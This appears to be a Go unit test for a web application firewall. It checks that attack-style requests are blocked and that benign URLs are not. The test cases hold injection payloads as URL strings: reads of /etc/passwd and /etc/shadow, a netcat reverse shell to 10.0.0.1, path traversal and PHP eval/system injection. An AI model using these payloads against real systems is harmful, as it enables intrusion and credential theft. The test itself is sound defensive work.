package engine

import (
	"context"
	"net/http"
	"testing"

	"github.com/sentinel-waf/sentinel-waf/pkg/model"
	"github.com/sentinel-waf/sentinel-waf/pkg/rules"
)

func TestEngine_M06_CRS(t *testing.T) {
	e := NewEngine()
	err := e.LoadRules(rules.GetDefaultRules())
	if err != nil {
		t.Fatalf("Failed to load rules: %v", err)
	}

	tests := []struct {
		name        string
		req         *model.RequestContext
		shouldBlock bool
	}{
		// RCE (932xxx)
		{
			name: "RCE: basic cat /etc/passwd",
			req: &model.RequestContext{
				URL:     "/api/v1/debug?cmd=cat /etc/passwd",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: true,
		},
		{
			name: "RCE: shell pipe injection",
			req: &model.RequestContext{
				URL:     "/search?q=foo|id",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: true,
		},
		{
			name: "RCE: background execution",
			req: &model.RequestContext{
				URL:     "/search?q=foo&nc -e /bin/sh 10.0.0.1 4444",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: true,
		},
		// LFI (930xxx)
		{
			name: "LFI: directory traversal",
			req: &model.RequestContext{
				URL:     "/static/../../../../etc/shadow",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: true,
		},
		{
			name: "LFI: Windows ini",
			req: &model.RequestContext{
				URL:     "/download?file=C:\\windows\\win.ini",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: true,
		},
		// PHP (933xxx)
		{
			name: "PHP: eval injection",
			req: &model.RequestContext{
				URL:     "/api/v1/config?cfg=eval(base64_decode('...'))",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: true,
		},
        {
			name: "PHP: open tag",
			req: &model.RequestContext{
				URL:     "/upload?content=<?php system('id'); ?>",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: true,
		},
        // Safe Requests
        {
			name: "Safe: query parameter with 'cat' in word",
			req: &model.RequestContext{
				URL:     "/search?q=category",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: false,
		},
        {
			name: "Safe: file path with dots",
			req: &model.RequestContext{
				URL:     "/static/js/main.v1.2.3.js",
				Method:  "GET",
				Headers: make(http.Header),
			},
			shouldBlock: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, blocked := e.InspectRequest(context.Background(), tt.req)
			if blocked != tt.shouldBlock {
				t.Errorf("Engine.InspectRequest(%s) blocked = %v, want %v", tt.name, blocked, tt.shouldBlock)
			}
		})
	}
}
